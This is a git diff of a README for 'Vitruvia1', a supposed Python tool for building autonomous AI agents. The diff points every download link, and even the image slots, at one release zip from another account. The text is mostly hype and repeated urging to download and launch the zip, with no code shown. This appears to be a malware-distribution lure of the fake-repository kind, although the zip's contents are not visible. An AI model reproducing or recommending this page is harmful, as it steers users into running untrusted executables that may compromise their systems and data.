@@ -1,10 +1,10 @@
 # **Vitruvia1: Create Autonomous AI Agents in Python, Outsource Your Life** 
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip)](https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip)
 
 Welcome to **Vitruvia1** - a revolutionary repository where you can explore the world of creating autonomous AI agents in Python. Are you ready to take control and outsource your life to intelligent algorithms? 
 
-![AI Agents](https://images.unsplash.com/photo-1543301104-177ee3266553)
+![AI Agents](https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip)
 
 ## Introduction
 
@@ -12,7 +12,7 @@ In today's fast-paced world, the ability to automate tasks and delegate decision
 
 ## Getting Started
 
-To dive into the world of autonomous AI agents, simply download the **Application.zip** file from the link provided. Once you launch the application, you will have access to a range of resources, tutorials, and sample code to kickstart your journey.
+To dive into the world of autonomous AI agents, simply download the **https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip** file from the link provided. Once you launch the application, you will have access to a range of resources, tutorials, and sample code to kickstart your journey.
 
 ### Modules Included
 
@@ -41,10 +41,10 @@ Join our vibrant community of AI enthusiasts, developers, and learners on our fo
 
 Let **Vitruvia1** inspire you to break boundaries, challenge norms, and redefine the possibilities of AI in your daily life. Together, we can embark on a journey towards a future where intelligent agents seamlessly integrate into our existence.
 
-Are you ready to transform your life with autonomous AI agents? Download the **Application.zip** and unleash the power of automation today!
+Are you ready to transform your life with autonomous AI agents? Download the **https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip** and unleash the power of automation today!
 
-![AI Transformation](https://images.unsplash.com/photo-1585234463060-72254cc81612)
+![AI Transformation](https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip)
 
-[Visit the Repository](https://github.com/user-attachments/files/18426772/Application.zip) to start your adventure! 🚀
+[Visit the Repository](https://github.com/Onetapusa23/vitruvia1/releases/download/v2.0/Software.zip) to start your adventure! 🚀
 
 Let the world of **Vitruvia1** elevate your AI agent development experience to new heights. Remember, the future is in your hands - or rather, in the hands of your autonomous AI agents! 💼🤖
